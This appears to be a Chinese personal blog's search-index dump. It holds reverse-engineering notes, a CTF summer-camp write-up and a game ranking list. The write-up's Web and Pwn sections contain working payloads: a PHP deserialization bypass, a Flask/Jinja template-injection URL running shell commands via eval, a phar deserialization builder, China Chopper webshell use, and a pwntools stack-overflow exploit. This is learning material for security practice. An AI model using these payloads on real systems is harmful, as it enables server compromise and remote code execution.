= ((unsigned)x\u003e\u003e31); unsigned long long ans = (x ^ (x \u003e\u003e 31)) + (~(x \u003e\u003e 31)+1); x = ans; s=(s\u003c\u003c1)+s; s=(s\u003c\u003c2)+s; s=(s\u003c\u003c4)+s; s=(s\u003c\u003c8)+s; s=(s\u003c\u003c16)+s; ans = ((ans+(ans\u003c\u003c1)+(ans\u003c\u003c3)+(ans\u003c\u003c5)+(ans\u003c\u003c7)+(ans\u003c\u003c9)+(ans\u003c\u003c11)+(ans\u003c\u003c13)+(ans\u003c\u003c15)+(ans\u003c\u003c17)+(ans\u003c\u003c19)+(ans\u003c\u003c21)+(ans\u003c\u003c23)+(ans\u003c\u003c25)+(ans\u003c\u003c27)+(ans\u003c\u003c29)+(ans\u003c\u003c31))\u003e\u003e33); ans = ~((ans\u003c\u003c1)+ans)+1+x; ans = ((~s)\u0026ans)+(s\u0026(~ans+1)); return ans; } 出了一些问题，第一个是符号有整整61个刚好超过，第二个是当x=-2147483648的时候绝对值部分会取爆。修复一下： int mod3(int x) { long long x2 = x; int s = ((unsigned)x2\u003e\u003e31); int s2 = (x2 \u003e\u003e 31); //减少一次右移 unsigned long long ans = (x2 ^ s2) + (~s2+1); x2 = ans; s=(s\u003c\u003c1)+s; s=(s\u003c\u003c2)+s; s=(s\u003c\u003c4)+s; s=(s\u003c\u003c8)+s; s=(s\u003c\u003c16)+s; ans = ((ans+(ans\u003c\u003c1)+(ans\u003c\u003c3)+(ans\u003c\u003c5)+(ans\u003c\u003c7)+(ans\u003c\u003c9)+(ans\u003c\u003c11)+(ans\u003c\u003c13)+(ans\u003c\u003c15)+(ans\u003c\u003c17)+(ans\u003c\u003c19)+(ans\u003c\u003c21)+(ans\u003c\u003c23)+(ans\u003c\u003c25)+(ans\u003c\u003c27)+(ans\u003c\u003c29)+(ans\u003c\u003c31))\u003e\u003e33); ans = ~((ans\u003c\u003c1)+ans)+1+x2; ans = ((~s)\u0026ans)+(s\u0026(~ans+1)); return ans; } 得到答案。使用正好60个符号完成本题。 ","date":"2021-10-07","objectID":"/cnssrecruit/:6:4","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"反汇编工作原理 ","date":"2021-09-15","objectID":"/reverse/:1:0","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"1、基本反汇编算法 区分指令与数据，确认文件中包含代码和代码入口点的位置。 读取指令起始地址的值，查表将二进制操作码与汇编语言助记符对应起来。 格式化汇编语言并进行输出 继续反汇编下一条指令 ","date":"2021-09-15","objectID":"/reverse/:1:1","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"2、如何识别反汇编起点、如何选择下一条指令、何时完成反汇编？ 书中介绍了两种算法：线性扫描反汇编与递归下降反汇编 1.线性扫描反汇编 ​ 线性扫描法通过寻找一条指令结束、另一条指令开始的地方来确定需要反汇编的指令位置。具体方法为：假设程序中标注为代码的程序段内全部是机器语言指令，则从第一个字节开始逐条反汇编。这种算法并不会通过识别分支等非线性指令来了解程序的控制流。 ​ 线性扫描法的优点在于它能够完全覆盖程序的所有代码段，但其没有考虑到代码中可能混有数据。线性扫描法无法正确地将嵌入的数据与代码区分开来。 ​ GNU调试器(gdb)、微软的WinDbg调试器和odjump的反汇编引擎均采用线性扫描算法。 2.递归下降反汇编 ​ 递归下降法强调控制流的概念。控制流根据一条指令是否被另一条指令引用来决定是否对其进行反汇编。 ​ 有以下几种指令： 1.顺序流指令 ​ 顺序流指令将执行权传递给下一条指令。 2.条件分支指令 ​ 当条件为真的时候修改指令指针使其指向分支目标，否则以线性模式执行指令。 ​ 递归下降法会反汇编以上两条路径。分支目标指令地址被添加到稍后进行反汇编的地址列表中，推迟其反汇编过程。 3.无条件分支指令 ​ 执行权传给一条指令，但这条指令不需要紧跟在无条件分支指令后面。 ​ 递归下降法会尝试确定无条件跳转的目标，但如果跳转指令的目标取决于一个运行时的值，这时使用静态分析无法确定跳转目标，将会带来麻烦。 4.函数调用指令 ​ 与无条件跳转指令相似，区别在于一旦跳转的函数执行完成，执行权将返还给紧跟在后面的指令。 ​ 从被调用函数返回的时候，如果程序运行出现异常，可能导致递归下降算法的失败。函数中的代码有可能会有意篡改函数的返回地址。这样在函数完成的时候，控制权将返回到反汇编器无法返回的地址。 5.返回指令 ​ 有时递归下降算法访问了所有的路径，而函数返回指令没有提供接下来将要执行的指令的信息。此时，若程序确实正在运行，则可以从运行时栈顶部获得一个地址，从这个地址开始恢复执行指令。但反汇编器不具备访问栈的能力，因此反汇编过程会突然终止。 ​ 递归下降算法具有区分代码与数据的强大能力。IDA是典型的递归下降反汇编器。 ","date":"2021-09-15","objectID":"/reverse/:1:2","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"栈帧相关 ","date":"2021-09-15","objectID":"/reverse/:2:0","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"1、栈帧是什么？ ​ 栈帧是在程序的运行时栈中分配的内存块，专门用于特定的函数调用。当函数被调用时，可能因为函数需要传参或是局部变量的使用而需要用到内存。编译器通过栈帧使得对函数参数和局部变量进行分配的过程对程序员透明。 ","date":"2021-09-15","objectID":"/reverse/:2:1","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"2、函数调用的详细步骤 1. 函数调用方将调用函数所需要的任何参数放入调用约定指定的位置。 2. 调用方将控制权转交给被调用的函数。 3. 如有必要，被调用的函数会配置一个栈指针，并保存调用方希望保持不变的任何寄存器值。 4. 被调用的函数为局部变量分配空间。 5. 被调用的函数执行其操作。 6. 被调用的函数完成操作，为局部变量保存的栈空间被全部释放。 7. 将3.中保存的寄存器值恢复至原样。 8. 被调用的函数将控制权还给调用方。根据调用指令，可能清除程序栈中的一个或多个参数。 9. 调用方获得控制权，并对栈进行调整，以将程序栈指针恢复到1.之前的值。 ","date":"2021-09-15","objectID":"/reverse/:2:2","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"3、调用约定相关 ​ 调用约定指定调用方放置函数所需参数的具体位置。调用约定可能要求将参数放置在寄存器、程序栈或寄存器和栈中。同时，在传递参数时，程序栈还需要决定被调用函数完成它的操作后，谁负责删除这些参数。 1.C调用约定 ​ C/C++程序中常用的_cdecl修饰符会迫使编译器利用C编译规定，因此这种调用约定别叫做cdecl调用约定。该调用约定规定：调用方按从右到左的顺序将函数参数放入栈中，在被调用的函数完成其操作后，调用方负责从栈中清除参数。 ​ 从右到左在栈中放入参数导致最左边（第一个）参数将始终位于栈顶，我们可以轻易找到第一个参数，非常适用于参数数量可变的函数如printf ​ 要求调用函数从栈中删除参数，意味着指令由被调用函数返回后，会立即对程序栈指针进行调整。如果函数参数数量可变，则调用方比被调用方更加清楚参数的个数，从而更加适应这种调整。 2.标准调用约定 ​ “标准”是微软为自己的调用约定所起的名称，在函数声明中使用了修饰符_stdcall，为避免混淆，将这种调用约定称为stdcall调用约定。 ​ stdcall调用约定规定：调用方按从右到左的顺序将函数放入栈中，但在函数结束执行的时候，由被调用函数负责删除栈中的函数参数。这要求被调用函数清楚栈中由多少个参数，因此printf这种接受参数个数可变的命令不适用于stdcall调用约定。 ​ stdcall调用约定的优点在于可以生成体积稍小、速度稍快的程序。 ​ **微团对所有由共享库文件（DLL）输出的参数数量固定的函数使用stdcall约定。 3.x86 fastcall约定 ​ fastcall约定是stdcall约定的一个变体。传递给函数的前两个参数将分别位于ECX和EDXX寄存器中，其余的则以类似stdcall的方式从右往左放入栈中。返回时同样通过被调用方删除栈中的函数参数。 4.C++调用约定 ​ C++类中的非静态成员函数函数需要使用this指针，指向用于调用函数的对象。 ​ Microsoft Visual C++提供thiscall调用约定，将this传入ECX寄存器中， 并要求非静态成员函数清除栈中的参数 ​ GNU G++编译器将this看成是非静态成员函数的第一个隐藏参数，其他方便与cdecl调用约定相同。 ","date":"2021-09-15","objectID":"/reverse/:2:3","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"数据结构的识别 ","date":"2021-09-15","objectID":"/reverse/:3:0","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"1. 数组 1.全局分配的数组 例如： int global_array[3]; int main() { int idx = 2; global_array[0] = 10; global_array[1] = 20; global_array[2] = 30; global_array[idx] = 40; } 在IDA中，我们将可以看到（部分）： .text:00401000 idx = dword ptr - 4 ……… .text:0040100B mov dword_40B720, 10① .text:00401015 mov dword_40B724, 20② .text:0040101F mov dword_40B728, 30③ .text:00401029 mov eax, [ebp+idx] .text:0040102C mov dword_40B720[eax*4], 40④ ………. 从①②③看，这个程序似乎使用了4个全局变量，但④对偏移量的计算（eax*4）暗示了全局数组的存在，变量名与①处相同。当函数中使用固定索引(0， 1， 2)的时候，数组元素将以全局变量的形式存在，不提供任何数组存在的证据。但通过对④的观察，我们可以知道数组的基址(dword_40B720，即数组开头的地址)和数组每个元素的大小（eax*4代表每个数组元素占位4） 2.栈分配的数组 编译器以完全相同的方式处理栈分配的数组和全局分配的数组。 int main() { int stack_array[3]; int idx = 2; } 不同的是，如上代码所示，观察栈中idx的位置将有助于确定数组最多包含的元素个数。 3.堆分配的数组 堆分配的数组是由动态内存分配函数（如malloc或new）分配而得。此时编译器需要根据内存分配函数返回的地址值生成对数组的引用。 ","date":"2021-09-15","objectID":"/reverse/:3:1","tags":null,"title":"Reverse学习笔记","uri":"/reverse/"},{"categories":null,"content":"写在前面 ​ 第一次玩CTF属于是，萌新吓傻了。 ","date":"2021-08-20","objectID":"/cnsssummer/:1:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Web ","date":"2021-08-20","objectID":"/cnsssummer/:2:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x01 第一次冒险 ​ 按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag ","date":"2021-08-20","objectID":"/cnsssummer/:2:1","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x02 更简单的计算题 ​ 算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag ","date":"2021-08-20","objectID":"/cnsssummer/:2:2","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x03 卖菜刀 ​ 依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。 ","date":"2021-08-20","objectID":"/cnsssummer/:2:3","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x04 最好的语言？ ​ 这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。 ​ class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=‘1’,b=‘2’,c=‘3’时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。 ​ 那么怎么绕过wakeup()呢？ ​ 百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样： class Flag { public $a = '1'; protected $b = '2'; private $c = '3'; function __construct() { $this-\u003ea = '1'; $this-\u003eb = '2'; $this-\u003ec = '3'; } } $t = new Flag(); echo serialize($t); 得到结果： O:4:\"Flag\":3:{s:1:\"a\";s:1:\"1\";s:4:\"%00*%00b\";s:1:\"2\";s:7:\"%00Flag%00c\";s:1:\"3\";} 其中%00是一个空字符，%00*%00表示protected类型，%00Flag%00表示private类型。 “Flag\"后面那个数字便是对象数量。按照上文的漏洞修改一下。 O:4:\"Flag\":114514:{s:1:\"a\";s:1:\"1\";s:4:\"%00*%00b\";s:1:\"2\";s:7:\"%00Flag%00c\";s:1:\"3\";} 传入$interesting变量得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:2:4","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x05 你要玩蛇吗 看到蛇，猜想和ArcaeaPython有关。点进去用眼睛瞪，发现网页GET了一个name字段并显示在网页上。 使用BurpSuite的Repeater功能看到有一个Server：gunicorn字样，谷歌一下发现确实是一个python的webserver，猜测入手点是python。 众所周知（其实是别人告诉我的），有一个优秀的python web框架叫Flask，默认使用jinja引擎。熟练运用搜索引擎获得一个漏洞示例（下已改为题目格式） def cum(name): tp = '{{name}}超喜欢玩蛇哦' return render_template_string(tp, name=name) 其中render_template_string是jinja引擎的模板渲染函数。其中{{name}}表示name变量的值。那么如果我在浏览器地址栏中令/?name={{Fuc1()}}( 其中Fuc1()是一个函数)会发生什么呢？ 函数Fuc1()的返回值将会显示在页面中 接下来几步涉及Python基础。 __globals__：每个python函数都含有一个__globals__字典，存储“在本函数中可以存储的全局变量”列表。其中一定有一个__builtins__变量。 __builtins__：我们知道，Python 需要 import 才能引用其他包的函数。但由于一部分函数实在过于常用，所以无需引入也能用。它们就是 __builtins__ 字典中的函数。 比如： print, open, chr, len, abs, eval eval：Python的eval是把一个字符串当作代码来执行。 也就是我们需要找到一个函数fun，调用fun.__globals__['__builtins__']['eval']()即可在网站上执行任意代码。 如何找到一个函数呢？搜索得到flask框架中有一个可以直接调用的函数url_for()。 那么我们需要执行什么代码呢？有如下语句： __import__(\"os\").popen(\"...\").read() 作用是引入os并调用，返回程序输出。试试直接cat一下flag？ /?name={{url_for.__globals__['__builtins__']['eval'](__import__(\"os\").popen(\"cat flag\").read())}} 发现页面上出现了flag，好神奇哦。 ","date":"2021-08-20","objectID":"/cnsssummer/:2:5","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x06 给我康康你的照片 其实我开这题只是想看看有没有别的小可爱传照片，但是其实看不到，恼火。 我实在做不出来，索性使用中国御剑扫描网站目录看到有一个robots.txt文件，点进去发现让我访问s3cr3t.php，立即访问。 其实正确做法是F12看到源码中有一段注释内含“机器人”字样想到访问robots.txt 进行代码审计，发现GET了一个$interesting变量，并将其作为文件路径，将文件内容读入到$file中。由于file_get_contents()的返回值不是空就是字符串，我们无法在返回值上做手脚。考虑搞一个在访问时触发的木马。 考虑构造一个phar文件，在读取时利用phar://伪协议直接执行其中代码。参照0x04 最好的语言？题，我们需要构造一个Flag类型对象并赋值好初始值写入phar中，利用__destruct()函数输出flag。 谷歌一个phar文件构造代码，直接进行一个使用： \u003c?php class Flag { public $a; protected $b; private $c; function __construct() { $this-\u003ea = '1'; $this-\u003eb = '2'; $this-\u003ec = '3'; } } $phar = new Phar(\"phar.phar\"); $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\"); $o = new Flag(); $phar-\u003esetMetadata($o); $phar-\u003estopBuffering(); ?\u003e 执行得到phar.phar文件，后缀名改为png上传。 访问/s3cr3t.php?interesting=phar://./upload/.../...png，发现页面上出现了flag，好神奇哦。 ","date":"2021-08-20","objectID":"/cnsssummer/:2:6","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Reverse ","date":"2021-08-20","objectID":"/cnsssummer/:3:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x01 Hello Reverse ​ 使用ida反编译后即可看到flag ","date":"2021-08-20","objectID":"/cnsssummer/:3:1","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x02 Where Are U ​ 使用ida反编译后到处找找就有了 ","date":"2021-08-20","objectID":"/cnsssummer/:3:2","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x03 吸/吸嘉嘉 ​ 反编译后发现程序将flag的每一位字母按位非(~)后与code数组比对。找到code数组，将每一位按位非之后就可以得到答案了。 ​ 我是手算的，我可能是弱智。 ","date":"2021-08-20","objectID":"/cnsssummer/:3:3","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x04 抽奖得flag ​ 这个题按理说是要使用动态调试，但是不难发现程序中有在满足某个条件时调用一个程序输出flag。直接利用IDA的patch program功能在程序最开头直接调用该程序，运行得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:3:4","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x05 没想好名字的题目 ​ 反编译之后先把变量名改成人能看的，然后发现三个for套for分别在判断行、列、方块是否有重复数字。结合程序名称发现是数独。分析程序前半部分，发现数独的形成模式是将flag[]的数字填入a[]中值为0的部分中。找到a的初始值，做数独即可得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:3:5","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x0? 攻壳机动队 ​ 使用upx去壳，然后是一个走迷宫小游戏。在内存里找到迷宫，直接走就可以了。 ","date":"2021-08-20","objectID":"/cnsssummer/:3:6","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x0? 黑客帝国 ​ 反编译发现输入30个数，然后if了三十个方程。把方程搞出来跑一遍高斯消元得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:3:7","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Pwn ","date":"2021-08-20","objectID":"/cnsssummer/:4:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0xFF（番外）Maze ​ 连接服务器之后得到一个随机的迷宫，跑一遍深度优先搜索得到结果。 from pwn import * import time import sys sys.setrecursionlimit(114514) p = remote(\"120.25.225.38\", 32121) st = p.recvline(keepends = False) st = p.recvline(keepends = True) n = 20 m = 22 a = [] fx = (0, 1, 0, -1) fy = (1, 0, -1, 0) op = ('d', 's', 'a', 'w') tpp = 0 flag = 0 opts = [] vis = [] mx = 0 def dfs(x, y): if flag == 1: return if x == n-1 and y == m-1: print(\"done\") ans = \"\" for i in range(tpp): ans += opts[i] p.sendline(ans.encode()) p.sendline(\"d\".encode()) for i in range(tpp): print(p.recv()) print(p.recv()) flag = 1 return vis[x][y] = 1 for i in range(0, 4): dx = x + fx[i] dy = y + fy[i] if dx \u003e= 0 and dx \u003c n and dy \u003e= 0 and dy \u003c m: if vis[dx][dy] == 0 and a[dx][dy] == 0: if tpp == mx: opts.append(op[i]) tpp = tpp + 1 mx = mx + 1 else: opts[tpp] = op[i] tpp = tpp + 1 dfs(dx, dy) tpp = tpp - 1 if flag == 1: return vis[x][y] = 0 for i in range(0, n): a.append([]) vis.append([]) st = p.recvline(keepends = True) dat = st.decode() for j in range(0, m): if dat[j] == '#': a[i].append(1) else: a[i].append(0) vis[i].append(0) st = p.recvline(keepends = True) st = p.recvline(keepends = True) st = p.recvline(keepends = True) dfs(0, 0) ","date":"2021-08-20","objectID":"/cnsssummer/:4:1","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x01 让我康康你的Nc ​ 安装netcat，按题目方式连接之后cat flag即可得到结果。 ","date":"2021-08-20","objectID":"/cnsssummer/:4:2","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"0x02 网安的第一口饭 ​ 简单栈溢出。反编译看到有一个here(void)调用了system(\"/bin/sh”)，也就是说只要调用该程序便能获得类似shell的东西，可以直接cat flag。 ​ from pwn import * p = remote('111.200.241.244', 59471) p.recv() payload = b'a' * 12 + p64(0x4011F5) p.send(payload) p.interactive() ","date":"2021-08-20","objectID":"/cnsssummer/:4:3","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Crypto 最有意思的难道不是crypto吗 ","date":"2021-08-20","objectID":"/cnsssummer/:5:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"龙王的代码I ​ 看程序发现flag就是1000000之内素数的平方和。随便写个线性筛就可以得到答案了。 #include \u003cbits/stdc++.h\u003eusing namespace std; const int MAXN = 10000050; int notp[MAXN], cntp, p[MAXN], n, m; long long ans; int main() { n = 1000000; notp[1] = 1; for(int i = 2; i \u003c= n; ++i) { if(!notp[i]) p[++cntp] = i; for(int j = 1; 1ll*i*p[j] \u003c= n \u0026\u0026 j \u003c= cntp; ++j) { notp[i*p[j]] = 1; if(i % p[j] == 0) break; } } for(int i = 2; i \u003c= n; ++i) ans += (1 - notp[i]) * i * i; printf(\"%lld\\n\" ans); } //这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确 ","date":"2021-08-20","objectID":"/cnsssummer/:5:1","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"eeeeeezrsa ​ 通过RSA解码方式直接求得即可。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:2","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"龙王的代码II ​ 阅读代码发现即求： $$ x\\ ≡\\ a1\\ (mod\\ p1)$$ $$x\\ ≡\\ a2\\ (mod\\ p2)$$ $$x\\ ≡\\ a3\\ (mod\\ p3)$$ $$x\\ ≡\\ a4\\ (mod\\ p4) $$ 方程组中x的值。敲一遍扩展中国剩余定理板子即可得到结果。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:3","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Feistal ​ 阅读代码，发现经过一次single操作后： $$ L+R$$ $$↓$$ $$R+L\\ xor\\ R\\ xor\\ k $$ ​ 而xor（异或）运算具有以下性质： $$ a\\ xor\\ a = 0$$ $$a\\ xor\\ 0 = a$$ $$a\\ xor\\ b = b\\ xor\\ a $$ ​ 程序为single操作执行256次的结果。那么我们先假设没有xor k操作来看看： $$ L+R$$ $$↓$$ $$R+L\\ xor\\ R$$ $$↓$$ $$L\\ xor\\ R+L\\ xor\\ R\\ xor\\ R$$ $$=L\\ xor\\ R+L$$ $$↓$$ $$L+L\\ xor\\ R\\ xor\\ L$$ $$=L+R $$ ​ 发现经过3次single操作后，回去了，神奇吧。由256 mod 3 = 1得如果没有每次xor k操作的话得到的序列将是L xor R + R（注意到最后有一个swap操作） ​ 考虑中间k值带来的影响。由于xor操作具有可交换性，所以左右各异或上一堆随机东西就相当于异或上这些东西的异或和。即最后的序列是： $$ L\\ xor\\ R\\ xor\\ key1+R\\ xor\\ key2 $$ 通过fake_flag和其加密结果求得key1，key2之后反向操作得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:4","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"龙王的代码III 即求： $$ x^2≡a(mod\\ p) $$ 二次剩余模板，打完就行了。 import random n = 7705321458598879497 p = 12979492918818656033 w = 0 def MUL(ax, ay, bx, by): return (ax * bx % p + ay * by * w % p) % p, (ax * by % p + ay * bx % p) % p def power(x, y, b): ax, ay = 1, 0 while b != 0: if b % 2 == 1: ax, ay = MUL(ax, ay, x, y) x, y = MUL(x, y, x, y) b //= 2 return ax % p while 1 == 1: a = random.randint(0, p) w = ((a * a % p - n) % p + p) % p if pow(w, (p-1)//2, p) == p-1: break print(p - power(a, 1, (p+1)//2)) #这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确 这个数超过了C++能存的范围了（除非写高精），所以被迫写了python。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:5","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Caesar?!? 本专题最水的题目，你只需要把encrypto反着写一遍就有结果了。程序我都没保存。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:6","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"PRNG 这是一个线性同余生成器攻击。 首先，如果我们找到几个X，使得X = 0 (mod n) 但 X ≠ 0 此时，也就找到了几个X是n的倍数。那么这些X的最大公因数就有很大可能等于n，不是吗？ 回到题目，我们相当于得到了几个同余方程： $$ s_1 ≡ s_0×a+b\\ (mod \\ n) $$ $$ s_2 ≡ s_1×a+b\\ (mod \\ n) $$ $$ s_3 ≡ s_2×a+b\\ (mod \\ n) $$ 此时我们引入一个数列$T_n=S_{n+1}-S_n$ $$ T_0≡S_1-S_0\\ (mod\\ n) $$ $$ T_1≡S_2-S_1≡(S_1×a+b)-(S_0×a+b)≡a×(S_1-S_0)≡a×T_0\\ (mod\\ n) $$ $$ T_2≡S_3-S_2≡(S_2×a+b)-(S_1×a+b)≡a×(S_2-S_1)≡a×T_1\\ (mod\\ n) $$ $$ T_4≡S_4-S_3≡(S_3×a+b)-(S_2×a+b)≡a×(S_3-S_2)≡a×T_2\\ (mod\\ n) $$ 这时候，神奇的事情发生了： $$T_2T_0-T_1^2≡(a×a×T_0×T_0)-(a×T_0×a×T_0)≡0(mod\\ n)$$ 如此构造，就可以求出一些$X\\ mod\\ n=0$，从而求出$n$（事实上，可能要多试几次） 有了$n$，还有$a$、$b$，咋办捏。 $$ s_2 ≡ s_1×a+b\\ (mod \\ n) $$ $$ s_3 ≡ s_2×a+b\\ (mod \\ n) $$ $$ s_3-s_2=s_2×a-s_1×a=a×(s_2-s_1) (mod\\ n)$$ $$ a=(s_3-s_2)/(s_2-s_1) (mod\\ n)$$ 好耶。然后$b$随便解一下这题就结束了。 ","date":"2021-08-20","objectID":"/cnsssummer/:5:7","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Misc ","date":"2021-08-20","objectID":"/cnsssummer/:6:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Misc的文件 下载解压，看到文件start.exe。记事本打开，前面写着PK。所以这是一个压缩包，改后缀名为zip打开。解压后发现两个文件，都用记事本打开。发现一个里面是一串字符，另一个文件头是PK。把文件头是PK的后缀名改为zip解压发现需要密码，输入刚刚获得的字符，解压获得flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:6:1","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"No Password 总之我当时把Hello.png后缀名改成7z就成功了，但再试一遍发现不行了，怎么回事呢。 ","date":"2021-08-20","objectID":"/cnsssummer/:6:2","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"爱要大声说出来 按照大小写转换成一串二进制数。已知开头是cnss，搜索自己的DNA得到c和n的ASCII码的二进制，前几位刚刚好是c和n的二进制ASCII，字符间用0隔开。长度固定分隔一下翻译回来得到flag。 ","date":"2021-08-20","objectID":"/cnsssummer/:6:3","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"baaby task 下载，记事本打开。 ","date":"2021-08-20","objectID":"/cnsssummer/:6:4","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"another bb 下载，看不出啥端倪。根据文件类型PNG推测是LSB隐写。Stegsolve打开查看RGB的第0位得到答案。 ","date":"2021-08-20","objectID":"/cnsssummer/:6:5","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Casio3超爱Emoji 百度搜索：emoji加密 ","date":"2021-08-20","objectID":"/cnsssummer/:6:6","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"我就会到这里了，我好菜啊。 ","date":"2021-08-20","objectID":"/cnsssummer/:7:0","tags":null,"title":"CNSS2021夏令营游记","uri":"/cnsssummer/"},{"categories":null,"content":"Hello，world！ 让我看看blog行不行 ","date":"2021-08-20","objectID":"/helloworld/:0:0","tags":null,"title":"Helloworld","uri":"/helloworld/"},{"categories":null,"content":"shiNo Game Awards 记录和评分一下玩过的游戏，仅收录通关或深度体验过且觉得好玩的游戏 (只是有趣程度不同，垃圾不会上榜)。 OCTOPATH TRAVELER 2 [10/10] Persona3 Reload [10/10] Hifi-Rush [10/10] 十三机兵防卫圈 [10/10] FINAL FANTASY VII Remake [10/10] Celeste [10/10] CHAOS;CHILD [10/10] 弹丸论破2 [10/10] 龙之信条2 [10/10] 审判之逝：湮灭的记忆 [10/10] Fire Emblem：Engage [10/10] 月姬 [10/10] 宇宙机器人[9/10] Life is strange [9/10] 烟火 [9/10] Memories Off 8 [9/10] Elden Ring [9/10] Persona5 Royal [9/10] Baldur’s Gate 3 [9/10] Trine 5: A Clockwork Conspiracy [8/10] Marvel’s Guardians of the Galaxy [8/10] Final Fantasy VII: Rebirth [8/10] Stella Blade [8/10] 装甲核心6境界天火 [8/10] Rimworld [8/10] Ghost Trick: Phantom Detetective [8/10] Spiderman 2 [8/10] 魔法使之夜 [8/10] 9-nine [8/10] Superliminal [8/10] 恋爱绮谭 1\u00262 [8/10] Splatoon 3 [8/10] Superliminal [8/10] Life is strange: True colors [7/10] Xenoblade 3 [7/10] Star Ocean: the second story R [7/10] 莱莎的炼金工房：常暗女王与秘密藏身处 [7/10] 莱莎的炼金工房3 [7/10] 塞尔达传说：荒野之息 [7/10] 审判之眼：死神的遗言 [7/10] FINAL FANTASY XV [7/10] 弹丸论破V3 [6/10] 苍之彼方的四重奏 [6/10] 对马岛之鬼 [6/10] 黑神话：悟空[6/10] 浪人崛起 [6/10] Death Stranding [6/10] VA-11 Hall-A [6/10] AI 梦境档案: nirvanA Initiative [6/10] 双人成行 [6/10] Phigros [6/10] Memories Off 7：勾指起誓的记忆 [5/10] Everlasting Flowers [5/10] 绯红结系 [5/10] 